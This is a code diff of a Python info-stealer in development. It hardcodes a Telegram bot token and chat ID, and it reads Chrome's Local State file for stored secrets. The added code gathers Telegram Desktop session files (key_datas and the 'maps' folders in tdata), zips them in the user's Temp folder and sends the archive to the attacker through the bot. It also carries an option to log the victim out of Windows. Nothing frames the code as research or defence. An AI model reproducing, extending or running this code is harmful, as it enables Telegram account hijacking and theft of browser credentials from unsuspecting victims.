@@ -8,6 +8,7 @@ try:
     import os
     import sqlite3
     import win32api
+    from zipfile import ZipFile
 except Exception as e:
     print("ERROR importing: " + repr(e))
     pass
@@ -17,12 +18,16 @@ log_out = 0  # 1 - is on, 0 - is off
 
 
 user_id = 441449437
-token = '911331866:AAFlisRSdl-vTOd5AN8BVfQpobo7FnU_vm8'
+token = '1192426793:AAHf4BSxdOehAukZp0SOxQMjmSanrkU6Klc'
 name_ur_txt = 'pass.txt'
 
 
 bot = TeleBot(token)
 pathusr = os.path.expanduser('~')
+local = os.getenv("LOCALAPPDATA")
+temp = os.path.join(local, "Temp")
+ttemp = os.path.join(local, "Temp", "tdata")
+#desktop = os.path.join(pathusr, "Desktop\\tdata\\")
 paths = ['C:\\', 'D:\\', 'E:\\', 'F:\\', 'G:\\', 'H:\\', 'I:\\', 'J:\\']
 path = os.path.expandvars(r'%LocalAppData%\Google\Chrome\User Data\Local State')
 
@@ -125,25 +130,75 @@ def send_txt():
         pass
 
 
+
+
 def send_session_files(path):
-    user = getFileProperties(os.path.join(path[:-5],"Telegram.exe"))["FileVersion"]
+    version = getFileProperties(os.path.join(path[:-5],"Telegram.exe"))["FileVersion"]
+    try:
+        os.mkdir(ttemp)
+        print("good")
+    except:
+        print("err")
     #print(user)
     for root, dirs, files in os.walk(path):
         for dir in dirs:
             if dir[0:15] == "D877F783D5D3EF8":
                 mapsdir = os.path.join(path, dir)
+                try:
+                    os.mkdir(os.path.join(ttemp, dir))
+                except:
+                    pass
+                if os.path.exists(os.path.join(root,dir,'maps')):
+                    #print("***OK Matched maps in " + path)
+                    shutil.copy2(os.path.join(mapsdir, 'maps'), (os.path.join(ttemp,dir,"maps")))
+            elif dir[0:15] == "A7FDF864FBC10B7":
+                mapsdir = os.path.join(path, dir)
+                try:
+                    os.mkdir(os.path.join(ttemp, dir))
+                except:
+                    pass
+                if os.path.exists(os.path.join(root, dir, 'maps')):
+                    #print("***OK Matched maps in " + path)
+                    shutil.copy2(os.path.join(mapsdir, 'maps'), (os.path.join(ttemp, dir, "maps")))
+            elif dir[0:15] == "F8806DD0C461824":
+                mapsdir = os.path.join(path, dir)
+                try:
+                    os.mkdir(os.path.join(ttemp, dir))
+                except:
+                    pass
+                if os.path.exists(os.path.join(root, dir, 'maps')):
+                    #print("***OK Matched maps in " + path)
+                    shutil.copy2(os.path.join(mapsdir, 'maps'), (os.path.join(ttemp, dir, "maps")))
+                        # bot.send_document(user_id, open(os.path.join(mapsdir, file), 'rb'), caption=path + "\nVersion: " + user)
         for file in files:
             if file[0:15] == "D877F783D5D3EF8":
-                print("***OK Matched D877F783D5D3EF8 in " + path)
+                #print("***OK Matched D877F783D5D3EF8 in " + path)
                 pathd877 = os.path.join(path, file)
-                bot.send_document(user_id, open(os.path.join(file, pathd877), 'rb'), caption=path + "\nVersion: " + user)
-            elif file == "maps":
-                print("***OK Matched maps in " + path)
-                bot.send_document(user_id, open(os.path.join(mapsdir, file), 'rb'), caption=path + "\nVersion: " + user)
+                shutil.copy2(pathd877,(os.path.join(ttemp,file)))
+                #bot.send_document(user_id, open(os.path.join(file, pathd877), 'rb'), caption=path + "\nVersion: " + user)
+            elif file[0:15] == "A7FDF864FBC10B7":
+                #print("***OK Matched D877F783D5D3EF8 in " + path)
+                pathd877 = os.path.join(path, file)
+                shutil.copy2(pathd877,(os.path.join(ttemp,file)))
+            elif file[0:15] == "F8806DD0C461824":
+                #print("***OK Matched D877F783D5D3EF8 in " + path)
+                pathd877 = os.path.join(path, file)
+                shutil.copy2(pathd877,(os.path.join(ttemp,file)))
             elif file == "key_datas":
-                print("***OK Matched key_datas in " + path)
+                #print("***OK Matched key_datas in " + path)
                 pathkey = os.path.join(path, file)
-                bot.send_document(user_id, open(os.path.join(file, pathkey), 'rb'), caption=path + "\nVersion: " + user)
+                shutil.copy2(pathkey, (os.path.join(ttemp, file)))
+                #bot.send_document(user_id, open(os.path.join(file, pathkey), 'rb'), caption=path + "\nVersion: " + user)
+
+    with ZipFile(os.path.join(temp,'tdata.zip'), 'w') as zipObj:
+        # Iterate over all the files in directory
+        for folderName, subfolders, filenames in os.walk(ttemp):
+            for filename in filenames:
+                # create complete filepath of file in directory
+                filePath = os.path.join(folderName, filename)
+                # Add file to zip
+                zipObj.write(filePath)
+    bot.send_document(user_id, open(os.path.join(temp, 'tdata.zip'), 'rb'), caption=path + "\nVersion: " + version)
 
 
 if os.path.exists(pathusr + '\\AppData\\Roaming\\Telegram Desktop'):
@@ -168,7 +223,6 @@ def main():
         Chrome()
         bot.send_message(user_id, pathusr)
         send_txt()
-        # send_session_files()
         logout_windows(log_out)
     except Exception as e:
         print('ERROR: Main function: ' + repr(e))
@@ -178,4 +232,3 @@ def main():
 if __name__ == '__main__':
     main()
     print("***Finished***")
-
